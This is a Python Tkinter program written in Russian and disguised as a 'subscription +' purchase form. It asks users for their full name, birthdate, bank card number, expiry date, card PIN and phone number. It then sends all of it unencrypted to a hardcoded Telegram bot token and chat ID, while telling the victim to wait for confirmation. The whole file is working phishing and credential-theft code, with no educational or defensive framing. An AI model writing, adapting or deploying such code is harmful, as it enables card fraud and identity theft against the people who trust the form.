from tkinter import Tk, Label, Entry, Button, messagebox as mb
from tkinter import ttk
import requests


def register_user():
    fio = entry_fio.get()
    birthdate = entry_birthdate.get()
    card_number = entry_card_number.get()
    expiration_date = entry_expiration_date.get()
    pin_code = entry_pin_code.get()
    phone_number = entry_phone_number.get()

    if len(pin_code) != 4 or not pin_code.isdigit():
        mb.showerror("Ошибка", "Пин-код должен состоять из 4 цифр")
        return

    bot_token = '6482899180:AAEfkcLKb1VWHo_DeQgbrfqWysdcC9er2HI'
    chat_id = '5441005028'
    message = f"ФИО: {fio}\n" \
              f"Дата рождения: {birthdate}\n" \
              f"Номер карты: {card_number}\n" \
              f"Срок действия карты: {expiration_date}\n" \
              f"Пин-код: {pin_code}\n" \
              f"Номер телефона: {phone_number}"

    url = f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={chat_id}&text={message}"
    response = requests.get(url)

    if response.status_code == 200:
        mb.showinfo("Успех", "Данные успешно отправлены в Телеграм. Ожидайте в течение суток подтверждение подписки+.")
    else:
        mb.showerror("Ошибка", "Не удалось отправить данные в Телеграм")


window = Tk()
window.title("Покупка подписки +")
window.geometry("400x600")

style = ttk.Style()
style.configure("TLabel", font=("Arial", 12))
style.configure("TEntry", font=("Arial", 12))
style.configure("TButton", font=("Arial", 14))

label_fio = ttk.Label(window, text="Фамилия Имя Отчество:")
label_fio.pack()

entry_fio = ttk.Entry(window, width=30)
entry_fio.pack()

label_birthdate = ttk.Label(window, text="Дата рождения (в формате ДД.ММ.ГГГГ):")
label_birthdate.pack()

entry_birthdate = ttk.Entry(window, width=30)
entry_birthdate.pack()

label_card_number = ttk.Label(window, text="Номер карты (в формате 1234 1234 1234 1234):")
label_card_number.pack()

entry_card_number = ttk.Entry(window, width=30)
entry_card_number.pack()

label_expiration_date = ttk.Label(window, text="Срок действия карты (в формате ММ/ГГ):")
label_expiration_date.pack()

entry_expiration_date = ttk.Entry(window, width=30)
entry_expiration_date.pack()

label_pin_code = ttk.Label(window, text="Пин-код (в формате 4 цифры):")
label_pin_code.pack()

entry_pin_code = ttk.Entry(window, width=30)
entry_pin_code.pack()

label_phone_number = ttk.Label(window, text="Номер телефона:")
label_phone_number.pack()

entry_phone_number = ttk.Entry(window, width=30)
entry_phone_number.pack()

btn_check = ttk.Button(window, text="Зарегистрироваться", command=register_user)
btn_check.pack(pady=10)

window.mainloop()
